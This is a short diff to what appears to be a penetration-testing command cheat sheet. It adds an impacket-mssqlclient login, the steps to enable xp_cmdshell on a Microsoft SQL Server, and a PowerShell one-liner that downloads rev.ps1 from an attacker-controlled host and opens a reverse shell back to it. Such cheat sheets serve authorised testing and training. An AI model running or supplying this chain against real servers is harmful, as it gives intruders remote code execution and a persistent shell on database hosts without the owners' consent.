@@ -594,7 +594,12 @@ nmap -v -p 139, 445 --script=smb-os-discovery {IP ADDRESS}
 
 
 # Impacket-mssqlclient
+impacket-mssqlclient {USERNAME}:'{PASSWORD}'@{IP ADDRESS} 
 impacket-mssqlclient {USERNAME}:'{PASSWORD}'@{IP ADDRESS} -windows-auth
+
+# Enable Code Execution
+SQL> enable_xp_cmdshell
+SQL> EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://{LHOST}/rev.ps1"); Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT} | powershell -noprofile'
 
 # Note: Requires credentials
 # {IP ADDRESS}: IP Address of the Server
